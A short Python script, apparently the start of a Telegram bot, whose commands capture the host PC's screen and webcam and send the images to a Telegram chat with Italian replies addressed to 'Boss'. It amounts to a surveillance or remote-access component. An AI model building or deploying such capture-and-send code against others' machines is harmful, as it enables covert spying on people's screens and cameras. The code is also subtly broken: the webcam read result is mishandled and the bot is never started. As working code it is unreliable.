from telegram.ext.updater import Updater
from telegram.update import Update
from telegram.ext.callbackcontext import CallbackContext
from telegram.ext.commandhandler import CommandHandler
import pyautogui
import cv2

cam = cv2.VideoCapture(0)

def screenshot(update: Update, context: CallbackContext):
    pyautogui.screenshot("screenshot.png")
    update.message.reply_photo(open("screenshot.png", 'rb'))
    update.message.reply_text("Boss, ecco lo Screenshot del tuo PC")


def camera(update: Update, context: CallbackContext):
    image = cam.read()
    cv2.imwrite("webcam.png", image)
    update.message.reply_photo(open("webcam.png", 'rb'))
    update.message.reply_text("Boss, ecco la foto dalla Webcam del tuo PC")